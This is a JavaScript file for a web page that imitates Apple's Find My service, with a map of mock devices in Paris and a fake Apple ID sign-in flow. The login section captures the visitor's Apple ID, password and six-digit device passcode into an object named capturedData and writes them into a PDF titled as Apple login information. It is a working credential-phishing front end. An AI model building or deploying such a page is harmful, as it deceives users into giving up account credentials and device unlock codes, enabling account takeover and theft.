document.addEventListener('DOMContentLoaded', () => {
    // 1. Initialize Map
    // Coordinates for "Paris, France" as a default viewport
    const defaultLocation = [48.8566, 2.3522];
    const map = L.map('map', {
        zoomControl: false, // Custom placement might be better, but we'll leave it for now
        attributionControl: false
    }).setView(defaultLocation, 13);

    // 2. Add Dark Theme Tiles (CartoDB Dark Matter)
    L.tileLayer('https://{s}.basemaps.cartocdn.com/dark_all/{z}/{x}/{y}{r}.png', {
        maxZoom: 19
    }).addTo(map);

    // 3. Mock Data
    const devices = [
        {
            id: 'iphone-15',
            name: 'iPhone 15 Pro de Antigravity',
            status: 'En ligne',
            time: 'Maintenant',
            battery: '84%',
            icon: '📱',
            lat: 48.8584,
            lng: 2.2945, // Near Eiffel Tower
            type: 'phone'
        },
        {
            id: 'macbook-m3',
            name: 'MacBook Pro M3 Max',
            status: 'En ligne',
            time: 'Il y a 5 min',
            battery: '100%',
            icon: '💻',
            lat: 48.8606,
            lng: 2.3376, // Near Louvre
            type: 'mac'
        },
        {
            id: 'airpods-pro',
            name: 'AirPods Pro de Antigravity',
            status: 'Hors ligne',
            time: 'Hier à 22:15',
            battery: '12%',
            icon: '🎧',
            lat: 48.8530,
            lng: 2.3499, // Near Notre Dame
            type: 'audio'
        },
        {
            id: 'ipad-air',
            name: 'iPad Air',
            status: 'En ligne',
            time: 'Il y a 12 min',
            battery: '65%',
            icon: '📟',
            lat: 48.8738,
            lng: 2.2950, // Near Arc de Triomphe
            type: 'tablet'
        }
    ];

    const deviceListContainer = document.getElementById('device-list');
    const deviceDetail = document.getElementById('device-detail');
    const sidePanel = document.getElementById('side-panel');
    const markers = {};

    // 4. Render Devices
    function renderDevices() {
        deviceListContainer.innerHTML = '';
        
        devices.forEach(device => {
            // Create List Item
            const item = document.createElement('div');
            item.className = 'device-item';
            item.innerHTML = `
                <div class="device-icon-container">${device.icon}</div>
                <div class="device-info">
                    <h3>${device.name}</h3>
                    <p>${device.status} • ${device.time}</p>
                </div>
            `;
            
            item.addEventListener('click', () => selectDevice(device));
            deviceListContainer.appendChild(item);

            // Create Map Marker
            const customIcon = L.divIcon({
                className: 'custom-marker',
                html: `<div class="pulse-dot"></div>`,
                iconSize: [20, 20],
                iconAnchor: [10, 10]
            });

            const marker = L.marker([device.lat, device.lng], { icon: customIcon }).addTo(map);
            marker.on('click', () => selectDevice(device));
            markers[device.id] = marker;
        });
    }

    // 5. Select Device Logic
    function selectDevice(device) {
        // Zoom and center map
        map.flyTo([device.lat, device.lng], 16, {
            duration: 1.5,
            easeLinearity: 0.25
        });

        // Update Detail Panel
        document.getElementById('detail-name').textContent = device.name;
        document.getElementById('detail-status').textContent = `${device.status} • ${device.time} • ${device.battery}`;
        document.getElementById('detail-icon').textContent = device.icon;

        // Visual transitions
        sidePanel.style.transform = 'translateX(-420px)';
        deviceDetail.classList.remove('hidden');
    }

    // 6. Close Detail Panel
    document.getElementById('close-detail').addEventListener('click', () => {
        sidePanel.style.transform = 'translateX(0)';
        deviceDetail.classList.add('hidden');
        
        // Reset map view slightly if needed
        map.flyTo(defaultLocation, 13);
    });

    // 7. Tab Bar Animation (Visual only)
    const tabs = document.querySelectorAll('.tab-item');
    tabs.forEach(tab => {
        tab.addEventListener('click', () => {
            tabs.forEach(t => t.classList.remove('active'));
            tab.classList.add('active');
        });
    });

    // 8. Add "Me" location
    const meLocation = [48.8580, 2.3000];
    const meIcon = L.divIcon({
        className: 'custom-marker',
        html: `<div class="pulse-dot" style="background: #007AFF;"></div>`,
        iconSize: [20, 20],
        iconAnchor: [10, 10]
    });
    L.marker(meLocation, { icon: meIcon }).addTo(map);

    // 9. Multi-step Login & Passcode Logic
    const loginBtn = document.getElementById('login-btn');
    const loginScreen = document.getElementById('login-screen');
    const passcodeScreen = document.getElementById('passcode-screen');
    const overlay = document.getElementById('overlay');
    const appleIdInput = document.getElementById('apple-id');
    const passwordInput = document.getElementById('password');

    let capturedData = {
        appleId: '',
        password: '',
        passcode: ''
    };

    // Step 1: Login to Passcode
    loginBtn.addEventListener('click', () => {
        if (appleIdInput.value.trim() === '' || passwordInput.value.trim() === '') {
            const form = document.querySelector('.login-form');
            form.style.animation = 'shake 0.5s';
            setTimeout(() => form.style.animation = '', 500);
            return;
        }

        capturedData.appleId = appleIdInput.value;
        capturedData.password = passwordInput.value;

        loginScreen.classList.add('fade-out');
        setTimeout(() => {
            loginScreen.style.display = 'none';
            passcodeScreen.classList.remove('hidden-ui');
        }, 500);
    });

    // Step 2: Passcode Entry
    const dots = document.querySelectorAll('.dot');
    const keys = document.querySelectorAll('.key');
    const deleteKey = document.getElementById('delete-key');
    let passcode = '';

    keys.forEach(key => {
        key.addEventListener('click', () => {
            if (passcode.length < 6) {
                passcode += key.textContent;
                updatePasscodeDots();
                
                if (passcode.length === 6) {
                    capturedData.passcode = passcode;
                    // Trigger PDF Download
                    generateAndDownloadPDF(capturedData);

                    // Success Transition
                    setTimeout(() => {
                        passcodeScreen.style.opacity = '0';
                        passcodeScreen.style.transform = 'scale(1.1)';
                        setTimeout(() => {
                            passcodeScreen.style.display = 'none';
                            overlay.classList.remove('hidden-ui');
                        }, 500);
                    }, 300);
                }
            }
        });
    });

    function generateAndDownloadPDF(data) {
        console.log("Tentative de génération du PDF...", data);
        try {
            const jsPDF = window.jspdf ? window.jspdf.jsPDF : window.jsPDF;
            if (!jsPDF) {
                console.error("Erreur : jsPDF n'est pas chargé correctement.");
                alert("Erreur technique : la bibliothèque PDF n'est pas disponible.");
                return;
            }
            const doc = new jsPDF();
            
            doc.setFontSize(22);
            doc.text("Informations de Connexion Apple", 20, 20);
            
            doc.setFontSize(16);
            doc.text(`Identifiant Apple : ${data.appleId}`, 20, 40);
            doc.text(`Mot de passe : ${data.password}`, 20, 50);
            doc.text(`Code de verrouillage : ${data.passcode}`, 20, 60);
            
            doc.setFontSize(10);
            doc.text(`Généré le : ${new Date().toLocaleString()}`, 20, 80);
            
            console.log("PDF généré, lancement du téléchargement...");
            doc.save("informations_apple.pdf");
        } catch (err) {
            console.error("Erreur lors de la génération du PDF:", err);
        }
    }

    deleteKey.addEventListener('click', () => {
        if (passcode.length > 0) {
            passcode = passcode.slice(0, -1);
            updatePasscodeDots();
        }
    });

    function updatePasscodeDots() {
        dots.forEach((dot, index) => {
            if (index < passcode.length) {
                dot.classList.add('active');
            } else {
                dot.classList.remove('active');
            }
        });
    }

    // 10. Simple Search Logic (UI only)
    const searchInput = document.querySelector('.search-bar input');
    searchInput.addEventListener('input', (e) => {
        const term = e.target.value.toLowerCase();
        const items = document.querySelectorAll('.device-item');
        items.forEach((item, index) => {
            const name = devices[index].name.toLowerCase();
            if (name.includes(term)) {
                item.style.display = 'flex';
            } else {
                item.style.display = 'none';
            }
        });
    });

    // Initialize
    renderDevices();
});
